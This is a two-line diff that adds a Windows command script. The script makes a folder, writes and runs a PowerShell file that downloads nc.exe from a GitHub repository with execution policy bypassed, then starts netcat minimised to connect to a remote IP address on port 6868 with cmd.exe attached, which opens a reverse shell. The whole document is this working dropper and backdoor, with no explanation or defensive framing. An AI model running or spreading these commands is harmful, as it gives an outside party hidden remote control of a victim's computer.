@@ -1,0 +1,2 @@
+cd / & mkdir win & cd win & echo (wget "https://github.com/huyremy/netcat/raw/main/nc.exe" -OutFile nc.exe) > h.PS1 & powershell -ExecutionPolicy ByPass -File h.ps1
+START /MIN nc.exe 97.74.89.193 6868 -e cmd.exe -d & exit
